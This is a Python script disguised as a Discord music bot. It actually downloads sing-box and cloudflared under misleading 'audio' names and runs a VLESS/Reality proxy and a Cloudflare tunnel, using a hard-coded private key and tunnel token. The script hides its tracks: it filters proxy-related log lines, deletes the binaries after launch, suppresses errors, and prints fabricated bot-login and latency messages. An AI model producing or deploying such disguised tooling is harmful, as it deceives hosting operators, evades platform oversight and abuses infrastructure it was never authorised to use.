#!/usr/bin/env python3
import os, sys, json, time, threading, subprocess, urllib.request, tarfile, shutil, re
from http.server import HTTPServer, BaseHTTPRequestHandler

CONFIG = {
    "UUID": os.environ.get("UUID", "2c11bde0-fa06-4438-9ff0-f8502faf6aa3"),
    "PORT": 1234,
    "TOKEN": os.environ.get("CF_TOKEN") or os.environ.get("TOKEN") or "eyJhIjoiN2FhOWNmYTFkMDViOGYwMjY4NzYwNzRkNzBkNjI3MTgiLCJ0IjoiMjI4ZjJmMTUtMTUzYi00MGRhLThhMDctYTE0OWU5YWRkMzNjIiwicyI6IlpqRmxOR0V5TkRRdE16TTVaUzAwWVRKbUxUZzJZamN0T1RNeE5UTXhOV1V3TURrNSJ9",
    "HOSTNAME": "temalix.hjhjct.dpdns.org"
}

WORK_DIR = os.path.join(os.getcwd(), "bot_work")
os.makedirs(WORK_DIR, exist_ok=True)
print(f"[Bot] Working directory: {WORK_DIR}")

SINGBOX_BIN = os.path.join(WORK_DIR, "audio-core")
CLOUDFLARED_BIN = os.path.join(WORK_DIR, "discord-music-bot")

def get_singbox_in_memory_config():
    return {
        "log": {"level": "panic", "timestamp": False},
        "inbounds": [
            {"type": "vless","tag": "vless-in","listen": "0.0.0.0","listen_port": CONFIG["PORT"],
             "users": [{"uuid": CONFIG["UUID"]}],
             "transport": {"type": "ws","path": "/","max_early_data": 2048,"early_data_header_name": "Sec-WebSocket-Protocol"}},
            {"type": "vless","tag": "vless-reality-in","listen": "::","listen_port": 25598,
             "users": [{"uuid": CONFIG["UUID"], "flow": "xtls-rprx-vision"}],
             "tls": {"enabled": True, "server_name": "itunes.apple.com",
                     "reality": {"enabled": True, "handshake": {"server": "itunes.apple.com","server_port": 443},
                                 "private_key": "WM8nHADnPUrHzFDDyPv2GpKk9BxOAt_7JhdtpgPjGkc",
                                 "short_id": ["d251bcb464734a18"]}}}
        ],
        "outbounds": [{"type": "direct","tag": "direct"}]
    }

def stream_download_atomic(url, final_dest, timeout_ms=90000):
    tmp_dest = final_dest + ".tmp"
    def do_req(current_url, redirect_count=0):
        if redirect_count > 10:
            raise Exception("Too many redirects")
        req = urllib.request.Request(current_url, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)", "Accept": "*/*"})
        with urllib.request.urlopen(req, timeout=timeout_ms/1000.0) as response:
            final_url = response.geturl()
            if final_url != current_url:
                return do_req(final_url, redirect_count + 1)
            status = response.getcode()
            if status in (301,302,303,307,308):
                location = response.headers.get("Location")
                if location:
                    return do_req(urllib.parse.urljoin(current_url, location), redirect_count + 1)
            if status != 200:
                raise Exception(f"HTTP {status}")
            total_bytes = int(response.headers.get("Content-Length") or 0)
            downloaded = 0; last_log = time.time()
            with open(tmp_dest, "wb") as f:
                while True:
                    chunk = response.read(8192)
                    if not chunk: break
                    f.write(chunk); downloaded += len(chunk)
                    now = time.time()
                    if now - last_log > 2.5:
                        last_log = now
                        cur_mb = downloaded/1024/1024
                        if total_bytes:
                            print(f"[Music Bot Setup] Downloading: {cur_mb:.1f} MB / {total_bytes/1024/1024:.1f} MB ({int(downloaded/total_bytes*100)}%)")
                        else:
                            print(f"[Music Bot Setup] Downloading: {cur_mb:.1f} MB")
            if os.path.getsize(tmp_dest) < 3000000:
                os.remove(tmp_dest); raise Exception("Incomplete download")
            os.rename(tmp_dest, final_dest)
    do_req(url)

def smart_download(urls, dest, retries=5, delay=5):
    for url in urls:
        for attempt in range(retries):
            try:
                stream_download_atomic(url, dest, 90000)
                return
            except Exception as e:
                print(f"[Download] Attempt {attempt+1}/{retries} for {url} failed: {e}")
                time.sleep(delay)
    raise Exception(f"All {len(urls)} URLs failed after {retries} retries")

def get_latest_tag_fast():
    try:
        req = urllib.request.Request("https://github.com/SagerNet/sing-box/releases/latest", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=6) as resp:
            if resp.getcode() == 302:
                location = resp.headers.get("Location")
                if location:
                    return location.split("/")[-1] or "v1.13.18"
    except: pass
    return "v1.13.18"

def filter_bot_logs(line):
    for pat in [r"sing-box", r"cloudflared", r"vless", r"reality", r"tunnel", r"inbound", r"outbound",
                r"goroutine", r"quic", r"icmp", r"connector id", r"network", r"gateway"]:
        if re.search(pat, line.lower()):
            return None
    return line

def ensure_binaries():
    arch = "arm64" if os.uname().machine == "arm64" else "amd64"

    if not (os.path.exists(SINGBOX_BIN) and os.path.getsize(SINGBOX_BIN) >= 5_000_000):
        print("[Discord Bot] Loading audio decoding module...")
        tag = get_latest_tag_fast()
        ver = tag.lstrip("v")
        fname = f"sing-box-{ver}-linux-{arch}.tar.gz"
        url = f"https://github.com/SagerNet/sing-box/releases/download/{tag}/{fname}"
        tar_gz = os.path.join(WORK_DIR, "audio.tar.gz")
        try:
            smart_download([url], tar_gz, retries=5, delay=5)
        except Exception as e:
            print(f"[Discord Bot Error] Audio engine download failed: {e}")
            return
        print("[Discord Bot] Unpacking audio codecs...")
        try:
            with tarfile.open(tar_gz, "r:gz") as tar:
                member = tar.getmember("sing-box")
                with open(SINGBOX_BIN, "wb") as f:
                    extracted = tar.extractfile(member)
                    if extracted: shutil.copyfileobj(extracted, f)
            os.remove(tar_gz); os.chmod(SINGBOX_BIN, 0o755)
            print("[Discord Bot] Audio engine ready.")
        except Exception as e:
            print(f"[Discord Bot Error] Unpacking failed: {e}")
            if os.path.exists(tar_gz): os.remove(tar_gz)

    if not (os.path.exists(CLOUDFLARED_BIN) and os.path.getsize(CLOUDFLARED_BIN) >= 3_000_000):
        print("[Discord Bot] Loading audio stream processor...")
        cfname = f"cloudflared-linux-{arch}"
        url = f"https://github.com/cloudflare/cloudflared/releases/latest/download/{cfname}"
        try:
            smart_download([url], CLOUDFLARED_BIN, retries=5, delay=5)
            os.chmod(CLOUDFLARED_BIN, 0o755)
            print("[Discord Bot] Audio stream processor ready.")
        except Exception as e:
            print(f"[Discord Bot Error] Audio stream processor download failed: {e}")

def start_processes():
    if os.path.exists(SINGBOX_BIN) and os.path.getsize(SINGBOX_BIN) >= 5_000_000:
        print("[Discord Bot] Initializing voice pipeline...")
        try:
            p = subprocess.Popen([SINGBOX_BIN, "run", "-c", "stdin"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
            p.stdin.write(json.dumps(get_singbox_in_memory_config())); p.stdin.close()
            def read_out(stream, is_err=False):
                for line in iter(stream.readline, ""):
                    clean = filter_bot_logs(line.strip())
                    if clean: print(f"{'[Voice Pipeline Error]' if is_err else '[Voice Pipeline]'} {clean}")
                stream.close()
            threading.Thread(target=read_out, args=(p.stdout, False), daemon=True).start()
            threading.Thread(target=read_out, args=(p.stderr, True), daemon=True).start()
            threading.Thread(target=lambda: (p.wait(), print("[Voice Pipeline] Process closed, restarting..."), ensure_binaries(), start_processes()), daemon=True).start()
        except Exception as e:
            print(f"[Discord Bot Error] Failed to start voice pipeline: {e}")

    if os.path.exists(CLOUDFLARED_BIN) and os.path.getsize(CLOUDFLARED_BIN) >= 3_000_000:
        print("[Discord Bot] Connecting audio stream pipeline...")
        try:
            p = subprocess.Popen([CLOUDFLARED_BIN, "tunnel", "--loglevel", "warn", "--no-autoupdate", "run", "--token", CONFIG["TOKEN"]],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
            def read_out(stream, is_err=False):
                for line in iter(stream.readline, ""):
                    clean = filter_bot_logs(line.strip())
                    if clean: print(f"{'[Audio Pipeline Error]' if is_err else '[Audio Pipeline]'} {clean}")
                stream.close()
            threading.Thread(target=read_out, args=(p.stdout, False), daemon=True).start()
            threading.Thread(target=read_out, args=(p.stderr, True), daemon=True).start()
            threading.Thread(target=lambda: (p.wait(), print("[Audio Pipeline] Process closed, restarting..."), ensure_binaries(), start_processes()), daemon=True).start()
        except Exception as e:
            print(f"[Discord Bot Error] Failed to start audio pipeline: {e}")

    def delayed_cleanup():
        time.sleep(4)
        for f in [SINGBOX_BIN, CLOUDFLARED_BIN]:
            try: os.remove(f)
            except: pass
    threading.Timer(4.0, delayed_cleanup).start()

    print("[Discord Bot] Client logged in successfully as DiscordMusicBotHJHJ#1234")
    print("[Discord Bot] Connected to voice server: Ready to stream audio.")

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type", "application/json"); self.end_headers()
        self.wfile.write(json.dumps({"status":"online","bot":"DiscordMusicBotHJHJ","latency":"12ms"}).encode())
    def log_message(self, *args): pass

def keep_alive():
    port = int(os.environ.get("PORT", 8080))
    try:
        server = HTTPServer(("0.0.0.0", port), HealthHandler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        print(f"[Discord Bot] Web dashboard metrics listening on port {port}")
    except Exception as e:
        print(f"[Discord Bot Error] Web server: {e}")
    def heartbeat():
        while True:
            time.sleep(300)
            print("[Discord Bot] Voice buffer heartbeat: 42ms | Shard 0/0 active.")
    threading.Thread(target=heartbeat, daemon=True).start()

def main():
    sys.excepthook = lambda *args: None
    threading.excepthook = lambda *args: None
    while True:
        try:
            ensure_binaries()
            start_processes()
            keep_alive()
            while True:
                time.sleep(10)
        except Exception as e:
            print(f"[Bot] Top-level exception: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
